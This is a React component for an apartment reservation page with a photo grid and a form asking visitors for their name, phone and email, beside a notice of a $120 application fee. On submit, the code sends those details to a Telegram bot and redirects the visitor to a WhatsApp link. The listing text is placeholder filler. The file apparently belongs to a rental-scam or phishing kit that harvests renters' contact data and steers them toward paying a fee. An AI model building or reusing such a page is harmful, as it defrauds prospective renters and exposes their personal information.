import React from "react";
import TelegramSend from "../utils/send-message";

export default function PropertyPage() {
  const wls = window.location.search;
  const query = new URLSearchParams(wls);
  const apartment_num: string | null = query.get("apartment");
  const [apartmentNo, setApartmentNo] = React.useState<string>("1");

  React.useEffect(() => {
    setApartmentNo(apartment_num!);
  }, [apartment_num]);

  const [formInput, setFormInput] = React.useState({
    fandlname: "",
    email: "",
    phone:""
  });

  function handleInputChange(event: React.ChangeEvent<HTMLInputElement>) {
    setFormInput((prevData) => ({
      ...prevData,
      [event.target.name]: event.target.value,
    }));
  }

  const [isLoading, setIsLoading] = React.useState(false)

  async function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
    setIsLoading(true)
    event.preventDefault();

    const message = `
    [----+🏦 APARTMENT 🏦+-----]

    Full name: ${formInput.fandlname}

    Email: ${formInput.email}

    Phone: ${formInput.phone}

    `

   
    await TelegramSend(message);
    setIsLoading(false);
    window.location.href = "https://wa.link/z12cbp"
  }

  return (
    <div>
      <div className="container">
        <div id="myCarousel" className="carousel slide" data-ride="carousel">
          <ol className="carousel-indicators">
            {/* <li data-target="#myCarousel" data-slide-to="0" className="active"></li>
      <li data-target="#myCarousel" data-slide-to="1"></li>
      <li data-target="#myCarousel" data-slide-to="2"></li> */}
          </ol>

          {/* Tab start */}

          <div id="apart-tab" className="tab-pane fade show p-0 active">
            <div className="row g-4">


              {[1,2,3,4,5,6].map((value, key)=>(
                <div
                key={key}
                className="col-lg-4 col-md-6 wow fadeInUp"
                data-wow-delay="0.1s"
              >
                <div className="property-item rounded overflow-hidden">
                  <div className="position-relative overflow-hidden">
                      <img
                        className="img-fluid"
                        src={`img/aparte-${apartmentNo}/${value}.webp`}
                        alt=""
                      />
                  </div>
                </div>
              </div>
              ))}

              
              

            </div>
          </div>

          {/* Tab ends */}


<br /><br />
          <h2>Reserve this apartment</h2>
          <small>Note: To reserve this apartment, you have to pay an application fee of $120</small>
          <div className="book-down">
          <form method="POST" onSubmit={handleSubmit}>
            <div className="input-field">
              <label htmlFor="">First & Last name</label>
              <input required onChange={handleInputChange} name="fandlname" type="text" />
            </div>
            <div className="input-field">
              <label htmlFor="">Phone</label>
              <input type="tel" required onChange={handleInputChange} name="phone" />
            </div>
            <div className="input-field">
              <label htmlFor="">Email</label>
              <input type="email" required onChange={handleInputChange} name="email" />
            </div>

              {
                isLoading ?
                <button type="button" className="btn btn-primary">Please wait...</button>
                :
                <button type="submit" className="btn btn-primary">Submit</button>
              }
            
          </form>
          </div>
         
          
        </div>
      </div>

      {/* ENd */}
      {/* <section id="aa-properties">
        <div className="container">
          <div className="row">
            <div className="col-md-8">
              <div className="aa-properties-content">
                <div className="aa-properties-details">
                  <div className="aa-properties-info">
                    <h2>
                      Lorem ipsum dolor sit amet, consectetur adipisicing elit.
                      Ex, alias!
                    </h2>
                    <span className="aa-price">$65000</span>
                    <p>
                      Lorem ipsum dolor sit amet, consectetur adipisicing elit.
                      Quae voluptatibus veniam non voluptate, ipsa eius magni
                      aliquid ratione sit, odio reprehenderit in quis
                      repudiandae dolor.
                    </p>
                    <p>
                      Lorem ipsum dolor sit amet, consectetur adipisicing elit.
                      Amet consequatur, veritatis, ducimus in aliquam magnam
                      voluptatibus ullam libero fugiat temporibus at, aliquid
                      explicabo placeat eligendi, assumenda magni saepe eius
                      consequuntur.
                    </p>
                    <p>
                      Lorem ipsum dolor sit amet, consectetur adipisicing elit.
                      Praesentium dicta aliquid, autem, cum, impedit nostrum,
                      rem molestias quisquam ab iure enim totam? Itaque esse ut
                      adipisci officiis nulla repellendus ratione dolore, iste
                      ex doloribus tenetur eos provident quam quasi maxime.
                    </p>
                    <h4>Propery Features</h4>
                    <ul>
                      <li>4 Bedroom</li>
                      <li>3 Baths</li>
                      <li>Kitchen</li>
                      <li>Air Condition</li>
                      <li>Belcony</li>
                      <li>Gym</li>
                      <li>Garden</li>
                      <li>CCTV</li>
                      <li>Children Play Ground</li>
                      <li>Comunity Center</li>
                      <li>Security System</li>
                    </ul>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </section> */}

      
    </div>
  );
}
